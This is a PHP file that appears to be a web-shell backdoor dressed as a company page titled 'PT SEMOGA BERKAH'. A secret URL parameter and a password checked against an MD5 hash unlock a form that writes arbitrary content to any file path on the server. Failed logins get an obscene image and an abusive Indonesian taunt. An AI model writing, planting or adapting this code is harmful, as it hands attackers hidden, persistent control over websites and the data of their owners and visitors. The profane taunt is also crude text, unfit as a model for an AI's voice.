<?php
if (!isset($_GET['skipaja']) || $_GET['skipaja'] !== 'bg') {
    echo "Akses ditolak.";
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>PT SEMOGA BERKAH</title>
    <link rel="stylesheet" type="text/css" href="https://jakartamail.pro/aset.css" />
</head>
<body>
    <form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]) . '?skipaja=bg'; ?>">
        <label for="directory">Direktori:</label><br>
        <input type="text" id="directory" name="directory" value="<?php echo htmlspecialchars(realpath('./')); ?>" size="50"><br><br>
        <label for="file_name">Nama File:</label><br>
        <input type="text" id="file_name" name="file_name" required><br><br>
        <label for="file_content">Isi File:</label><br>
        <textarea id="file_content" name="file_content" rows="20" cols="50" required></textarea><br><br>
        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password" required><br><br>
        <input type="submit" value="Simpan">
    </form>
</body>
</html>

<?php
$stored_password = "f8a589e68b4c4edc48cf6683623ec808";
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $password = $_POST["password"]; 
    if (md5($password) === $stored_password) {
        $file_name = $_POST["file_name"];
        $file_content = $_POST["file_content"];
        $directory = $_POST["directory"]; 
        $file_path = $directory . '/' . $file_name;
        file_put_contents($file_path, $file_content);
    } else {
        echo "<br><br><br><center><img src='https://usagif.com/wp-content/uploads/gifs/middle-finger-13.gif' height='800' width='800'><p><h1>AWOKWOK HEKER KONTOL</h1></center>";
    }
}
?>
